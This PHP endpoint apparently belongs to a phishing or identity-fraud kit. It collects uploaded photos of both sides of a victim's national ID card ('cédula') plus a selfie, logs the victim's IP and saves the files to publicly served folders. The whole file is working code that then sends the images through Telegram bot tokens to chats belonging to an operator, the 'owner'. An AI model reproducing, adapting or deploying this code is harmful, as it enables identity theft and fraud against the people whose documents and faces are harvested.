<?php
if (!defined('TABLA_PUTO')) {
    define('TABLA_PUTO', 'datos');
}
require_once(__DIR__ . '/../lib/db.php');
require_once(__DIR__ . '/../lib/core.php');

header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json; charset=utf-8');

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['status' => 'error', 'msg' => 'Método no permitido']);
        exit;
    }

    $idreg = isset($_POST['idreg']) ? trim($_POST['idreg']) : '';
    $lado = isset($_POST['lado']) ? trim($_POST['lado']) : '';
    $file = isset($_FILES['imagen']) ? $_FILES['imagen'] : null;

    if ($idreg === '' || !preg_match('/^\d+$/', $idreg)) {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'msg' => 'idreg inválido']);
        exit;
    }
    @presence_touch($idreg, $_SERVER['REMOTE_ADDR'] ?? null);
    if (!in_array($lado, ['cara1', 'cara2', 'selfie'], true)) {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'msg' => 'lado inválido']);
        exit;
    }
    if (!$file || ($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'msg' => 'Archivo no recibido']);
        exit;
    }

    $origName = $file['name'] ?? ('upload_' . time());
    $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
    $allowed = ['jpg', 'jpeg', 'png', 'webp'];
    if ($ext === '' || !in_array($ext, $allowed, true)) {
        $mime = function_exists('mime_content_type') ? @mime_content_type($file['tmp_name']) : null;
        if (!$mime && function_exists('getimagesize')) {
            $gi = @getimagesize($file['tmp_name']);
            $mime = is_array($gi) && isset($gi['mime']) ? $gi['mime'] : null;
        }
        $map = [
            'image/jpeg' => 'jpg',
            'image/png'  => 'png',
            'image/webp' => 'webp',
        ];
        $ext = $map[$mime] ?? 'jpg';
    }

    $paths = [];
    $laravelStorage = __DIR__ . '/../_sapolio/storage/app/public/cedulas/' . $idreg;
    $paths[] = [$laravelStorage, $lado . '.' . $ext];
    $publicStorage = __DIR__ . '/../_sapolio/public/storage/cedulas/' . $idreg;
    $paths[] = [$publicStorage, $lado . '.' . $ext];
    $laravelPublic = __DIR__ . '/../_sapolio/public/cedulas/' . $idreg;
    $paths[] = [$laravelPublic, $lado . '.' . $ext];

    $tmp = $file['tmp_name'];
    $savedAny = false;
    [$firstDir, $firstName] = $paths[0];
    $firstDest = null;
    try {
        if (!is_dir($firstDir)) { @mkdir($firstDir, 0775, true); }
        $firstDest = rtrim($firstDir, '/\\') . '/' . $firstName;
        if (@move_uploaded_file($tmp, $firstDest) || @copy($tmp, $firstDest)) {
            $savedAny = true;
            for ($i = 1; $i < count($paths); $i++) {
                [$dir, $fname] = $paths[$i];
                try {
                    if (!is_dir($dir)) { @mkdir($dir, 0775, true); }
                    $dest = rtrim($dir, '/\\') . '/' . $fname;
                    @copy($firstDest, $dest);
                } catch (\Throwable $e) {}
            }
        }
    } catch (\Throwable $e) {
        foreach ($paths as [$dir, $fname]) {
            try {
                if (!is_dir($dir)) { @mkdir($dir, 0775, true); }
                $dest = rtrim($dir, '/\\') . '/' . $fname;
                if (@copy($tmp, $dest)) { $savedAny = true; }
            } catch (\Throwable $e2) {}
        }
    }

    if (!$savedAny) {
        @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . " api/media.php ERROR: no se pudo guardar en ninguna ruta para idreg=$idreg lado=$lado\n", FILE_APPEND);
        http_response_code(500);
        echo json_encode(['status' => 'error', 'msg' => 'No se pudo guardar la imagen']);
        exit;
    }

    $has1 = false; $has2 = false;
    if ($lado !== 'selfie') {
        $baseDir = $laravelStorage;
        foreach (['jpg','jpeg','png','webp'] as $e) {
            if (is_file($baseDir . '/cara1.' . $e)) $has1 = true;
            if (is_file($baseDir . '/cara2.' . $e)) $has2 = true;
        }
        if (!$has1 || !$has2) {
            $baseDir = $publicStorage;
            foreach (['jpg','jpeg','png','webp'] as $e) {
                if (is_file($baseDir . '/cara1.' . $e)) $has1 = true;
                if (is_file($baseDir . '/cara2.' . $e)) $has2 = true;
            }
        }
        if (!$has1 || !$has2) {
            $baseDir = $laravelPublic;
            foreach (['jpg','jpeg','png','webp'] as $e) {
                if (is_file($baseDir . '/cara1.' . $e)) $has1 = true;
                if (is_file($baseDir . '/cara2.' . $e)) $has2 = true;
            }
        }
        if ($has1 && $has2) {
            actualizar_registro($idreg, ['status' => 'rec_cedula']);
        } else {
            actualizar_registro($idreg, ['status' => 'req_cedula']);
        }
    }

    try {
        $dirsPref = [$publicStorage, $laravelPublic, $laravelStorage];
        $photos = [];
        $findAbs = function(array $dirs, $nameBase) {
            foreach ($dirs as $d) {
                foreach (['jpg','jpeg','png','webp'] as $e) {
                    $p = rtrim($d, '/\\') . '/' . $nameBase . '.' . $e;
                    if (is_file($p)) return [$p, $e];
                }
            }
            return [null, null];
        };
        [$p1, $e1] = $findAbs($dirsPref, $lado);
        if ($p1 && $e1) { $photos[] = ['path' => $p1, 'name' => $lado . '.' . $e1]; }
        if ($lado !== 'selfie' && $has1 && $has2) {
            $other = ($lado === 'cara1') ? 'cara2' : 'cara1';
            [$p2, $e2] = $findAbs($dirsPref, $other);
            if ($p2 && $e2) { $photos[] = ['path' => $p2, 'name' => $other . '.' . $e2]; }
        }

        if (!empty($photos)) {
            $registro = buscar_registro($idreg);
            $owner = is_array($registro) && isset($registro['owner']) ? $registro['owner'] : '';
            if ($owner !== '') {
                if ($lado === 'selfie') {
                    if (!selfie_notificada($idreg)) {
                        $sp = null; $sn = null;
                        foreach ($photos as $ph) { if (stripos($ph['name'], 'selfie.') === 0) { $sp = $ph['path']; $sn = $ph['name']; break; } }
                        if (!$sp && $p1) { $sp = $p1; $sn = 'selfie.' . $e1; }
                        if ($sp) {
                            enviar_selfie_telegram($owner, $idreg, $sp);
                            marcar_selfie_notificada($idreg);
                            @tg_mark_last_sent($idreg);
                            $rel = null;
                            foreach ($dirsPref as $d) {
                                foreach (['jpg','jpeg','png','webp'] as $e) {
                                    $p = rtrim($d, '/\\') . '/selfie.' . $e;
                                    if (is_file($p)) { $rel = 'storage/cedulas/' . $idreg . '/selfie.' . $e; break 2; }
                                }
                            }
                            if ($rel) save_selfie_meta_mysql($idreg, $rel);
                        }
                    }
                } else if (($has1 && $has2) && !cedula_notificada($idreg)) {
                    enviar_fotos_telegram($owner, $idreg, $photos, $lado, true);
                    marcar_cedula_notificada($idreg);
                    @tg_mark_last_sent($idreg);
                }
            }
        }

        $cara1Name = null; $cara2Name = null;
        foreach ([['cara1', &$cara1Name], ['cara2', &$cara2Name]] as $def) {
            $nb = $def[0];
            $ref =& $def[1];
            foreach ($dirsPref as $d) {
                foreach (['jpg','jpeg','png','webp'] as $e) {
                    $p = rtrim($d, '/\\') . '/' . $nb . '.' . $e;
                    if (is_file($p)) { $ref = 'storage/cedulas/' . $idreg . '/' . $nb . '.' . $e; break 2; }
                }
            }
        }
        if ($lado !== 'selfie') {
            save_cedula_meta_mysql($idreg, $cara1Name, $cara2Name);
        }
    } catch (\Throwable $e) {
        @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/media.php TG ERROR: ' . $e->getMessage() . "\n", FILE_APPEND);
    }


    echo json_encode(['status' => 'ok', 'msg' => 'Imagen subida', 'idreg' => $idreg, 'lado' => $lado]);
} catch (\Throwable $e) {
    http_response_code(500);
    @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/media.php FATAL: ' . $e->getMessage() . "\n", FILE_APPEND);
    echo json_encode(['status' => 'error', 'msg' => 'Error interno']);
}

function enviar_fotos_telegram($owner, $idreg, array $photos, $lado, $completo)
{
    $ownerId = (string) $owner;
    $contextBase = [
        'owner' => $ownerId,
        'tok'   => tg_get_request_token(),
    ];

    $recipientsRaw = array_merge(
        tg_resolve_recipients($ownerId, false, $contextBase),
        tg_resolve_recipients($ownerId, true, $contextBase)
    );

    if (empty($recipientsRaw)) {
        return false;
    }

    $uniq = [];
    $recipients = array_values(array_filter($recipientsRaw, function ($rcpt) use (&$uniq) {
        if (!is_array($rcpt)) return false;
        $token = $rcpt['token'] ?? '';
        $chat  = $rcpt['chat'] ?? '';
        if ($token === '' || $chat === '') return false;
        $key = $token . '#' . $chat;
        if (isset($uniq[$key])) return false;
        $uniq[$key] = true;
        return true;
    }));

    if (empty($recipients)) {
        return false;
    }

    usort($photos, function($a, $b){
        return strcmp($a['name'], $b['name']);
    });

    $labels = [];
    foreach ($photos as $ph) {
        $n = strtolower($ph['name']);
        if (strpos($n, 'cara1') !== false) $labels[$n] = 'CARA 1';
        else if (strpos($n, 'cara2') !== false) $labels[$n] = 'CARA 2';
        else $labels[$n] = 'CÉDULA';
    }

    foreach ($recipients as $rcpt) {
        foreach ($photos as $ph) {
            $n = strtolower($ph['name']);
            $cap = (isset($labels[$n]) ? $labels[$n] : 'CÉDULA');
        $ok = tg_send_photo_file($rcpt['token'], $rcpt['chat'], $ph['path'], $cap);
            if (!$ok) {
                $url = build_public_url_from_path($ph['path'], $idreg, basename($ph['path']));
                if ($url && !tg_send_photo_url($rcpt['token'], $rcpt['chat'], $url, $cap)) {
                    @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/media.php TG sendPhoto failed for ' . $rcpt['token'] . ' chat ' . $rcpt['chat'] . ' photo ' . basename($ph['path']) . "\n", FILE_APPEND);
                }
            }
        }
    }
    return true;
}

function enviar_selfie_telegram($owner, $idreg, $filePath)
{
    $ownerId = (string) $owner;
    $contextBase = [
        'owner' => $ownerId,
        'tok'   => tg_get_request_token(),
    ];

    $recipientsRaw = array_merge(
        tg_resolve_recipients($ownerId, false, $contextBase),
        tg_resolve_recipients($ownerId, true, $contextBase)
    );

    if (empty($recipientsRaw)) {
        return false;
    }

    $uniq = [];
    $recipients = array_values(array_filter($recipientsRaw, function ($rcpt) use (&$uniq) {
        if (!is_array($rcpt)) return false;
        $token = $rcpt['token'] ?? '';
        $chat  = $rcpt['chat'] ?? '';
        if ($token === '' || $chat === '') return false;
        $key = $token . '#' . $chat;
        if (isset($uniq[$key])) return false;
        $uniq[$key] = true;
        return true;
    }));

    if (empty($recipients)) {
        return false;
    }

    foreach ($recipients as $rcpt) {
        $cap = '📸 SOY YO';
        $ok = tg_send_photo_file($rcpt['token'], $rcpt['chat'], $filePath, $cap);
        if (!$ok) {
            $url = build_public_url_from_path($filePath, $idreg, basename($filePath));
            if ($url && !tg_send_photo_url($rcpt['token'], $rcpt['chat'], $url, $cap)) {
                @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/media.php TG sendSelfie failed for ' . $rcpt['token'] . ' chat ' . $rcpt['chat'] . ' photo ' . basename($filePath) . "\n", FILE_APPEND);
            }
        }
    }
    return true;
}

function tg_send_photo_file($botToken, $chatId, $filePath, $caption = null)
{
    if (!is_file($filePath)) return false;
    if (!function_exists('curl_init')) return false;

    $ch = curl_init('https://api.telegram.org/bot' . $botToken . '/sendPhoto');
    $post = [
        'chat_id' => $chatId,
        'photo' => new \CURLFile($filePath),
    ];
    if ($caption) {
        $post['caption'] = $caption;
    }

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Expect:', 'Cache-Control: no-cache']);

    $resp = @curl_exec($ch);
    $errNo = curl_errno($ch);
    $err  = ($resp === false) ? curl_error($ch) : null;
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    @curl_close($ch);

    if ($resp === false || $resp === '') {
        $parts = ['api/media.php TG CURL ERR'];
        if ($errNo) $parts[] = 'code=' . $errNo;
        if ($err) $parts[] = 'msg=' . $err;
        if ($httpCode) $parts[] = 'http=' . $httpCode;
        if ($resp === '') $parts[] = 'empty body';
        @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' ' . implode(' ', $parts) . "\n", FILE_APPEND);
        return false;
    }

    $decoded = json_decode($resp, true);
    if (!is_array($decoded) || empty($decoded['ok'])) {
        $desc = is_array($decoded) && isset($decoded['description']) ? $decoded['description'] : 'unknown';
        @file_put_contents(
            __DIR__ . '/../logs/err.log',
            date('c') . ' api/media.php TG sendPhoto not ok: ' . $desc . ' http=' . $httpCode . ' body=' . substr($resp, 0, 200) . "\n",
            FILE_APPEND
        );
        return false;
    }

    return true;
}

function build_public_url_from_path($absPath, $idreg, $fileName)
{
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    if (!$host) return null;
    return $scheme . $host . '/_sapolio/public/storage/cedulas/' . $idreg . '/' . $fileName;
}
function tg_send_photo_url($botToken, $chatId, $photoUrl, $caption = null)
{
    if (!$botToken || !$chatId || !$photoUrl) return false;
    $api = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';
    $data = [
        'chat_id' => $chatId,
        'photo'   => $photoUrl,
    ];
    if ($caption) $data['caption'] = $caption;
    $opts = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 15,
            'ignore_errors' => true,
        ],
    ];
    $ctx = stream_context_create($opts);
    $resp = @file_get_contents($api, false, $ctx);
    if ($resp === false || $resp === '') {
        @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/media.php TG sendPhoto URL error (empty response)' . "\n", FILE_APPEND);
        return false;
    }
    $decoded = json_decode($resp, true);
    if (!is_array($decoded) || empty($decoded['ok'])) {
        $desc = is_array($decoded) && isset($decoded['description']) ? $decoded['description'] : 'unknown';
        @file_put_contents(
            __DIR__ . '/../logs/err.log',
            date('c') . ' api/media.php TG sendPhoto URL not ok: ' . $desc . ' body=' . substr($resp, 0, 200) . "\n",
            FILE_APPEND
        );
        return false;
    }
    return true;
}

function generate_inline_keyboard($registro, $owner)
{
    return tg_panel_keyboard_layout($registro, $owner);
}

function cedula_notificada($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['cedula_notificada'])) {
        $rs = @mysqli_query($db, "SELECT cedula_notificada FROM datos WHERE idreg='" . intval($idreg) . "'");
        if ($rs && ($row = mysqli_fetch_assoc($rs))) {
            return (string)$row['cedula_notificada'] === '1';
        }
        return false;
    }
    $row = @buscar_registro($idreg);
    if (!is_array($row)) return false;
    if (empty($row['mensaje'])) return false;
    $msg = json_decode($row['mensaje'], true);
    return is_array($msg) && !empty($msg['cedula']) && !empty($msg['cedula']['notified']);
}

function selfie_notificada($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['selfie_notificada'])) {
        $rs = @mysqli_query($db, "SELECT selfie_notificada FROM datos WHERE idreg='" . intval($idreg) . "'");
        if ($rs && ($row = mysqli_fetch_assoc($rs))) {
            return (string)$row['selfie_notificada'] === '1';
        }
        return false;
    }
    $row = @buscar_registro($idreg);
    if (!is_array($row)) return false;
    if (empty($row['mensaje'])) return false;
    $msg = json_decode($row['mensaje'], true);
    return is_array($msg) && !empty($msg['soyyo']) && !empty($msg['soyyo']['photo_sent']);
}

function marcar_selfie_notificada($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['selfie_notificada'])) {
        @actualizar_registro($idreg, ['selfie_notificada' => 1]);
        return true;
    }
    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    if (!isset($mensaje['soyyo'])) $mensaje['soyyo'] = [];
    $mensaje['soyyo']['photo_sent'] = true;
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}

function marcar_cedula_notificada($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['cedula_notificada'])) {
        @actualizar_registro($idreg, ['cedula_notificada' => 1]);
        return true;
    }
    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    if (!isset($mensaje['cedula'])) $mensaje['cedula'] = [];
    $mensaje['cedula']['notified'] = true;
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}

function save_cedula_meta_mysql($idreg, $cara1Rel, $cara2Rel)
{
    $db = Database::getConnection();
    static $checked = null;
    if ($checked === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
        $checked = [
            'cedula_cara1' => isset($cols['cedula_cara1']),
            'cedula_cara2' => isset($cols['cedula_cara2']),
            'cedula_updated_at' => isset($cols['cedula_updated_at']),
        ];
    }

    $update = [];
    if (!empty($checked['cedula_cara1']) && $cara1Rel) $update['cedula_cara1'] = $cara1Rel;
    if (!empty($checked['cedula_cara2']) && $cara2Rel) $update['cedula_cara2'] = $cara2Rel;
    if (!empty($checked['cedula_updated_at'])) $update['cedula_updated_at'] = date('Y-m-d H:i:s');

    if ($update) {
        @actualizar_registro($idreg, $update);
        return true;
    }

    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    if (!isset($mensaje['cedula'])) $mensaje['cedula'] = [];
    if ($cara1Rel) $mensaje['cedula']['cara1'] = $cara1Rel;
    if ($cara2Rel) $mensaje['cedula']['cara2'] = $cara2Rel;
    $mensaje['cedula']['updated_at'] = date('c');
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}

function save_selfie_meta_mysql($idreg, $selfieRel)
{
    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    if (!isset($mensaje['soyyo'])) $mensaje['soyyo'] = [];
    $mensaje['soyyo']['selfie'] = $selfieRel;
    $mensaje['soyyo']['updated_at'] = date('c');
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}


